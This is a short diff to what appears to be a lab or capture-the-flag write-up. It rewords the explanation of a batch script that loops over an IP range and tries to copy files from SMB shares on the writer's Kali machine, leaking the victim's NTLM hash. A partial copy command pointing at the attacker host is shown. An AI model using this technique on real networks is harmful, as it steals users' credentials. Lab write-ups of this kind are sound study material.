@@ -20,8 +20,7 @@ copy \\%BaseRange%.%%A\laptop_data c:\users\pukcab\documents\old_data >nul 2>&1 
 )
 ```
 
-`SET BaseRange` is the IP-range where our kali machine is located.\
-Set Min and Max, is the specific host within this ip-range. Our kali machine is located within the IP-range `192.168.248.1` through `192.168.248.25`
+`SET BaseRange` is the IP-range where our kali machine is located. `Set Min` and `set Max`, is the specific host within this ip-range. Our kali machine is located within the IP-range `192.168.248.1` through `192.168.248.25`
 
 The for loop is going to loop through the IP-range and tries to 'copy' a file from a non-existing share. This will result in leaking the NTLM-hash.
 
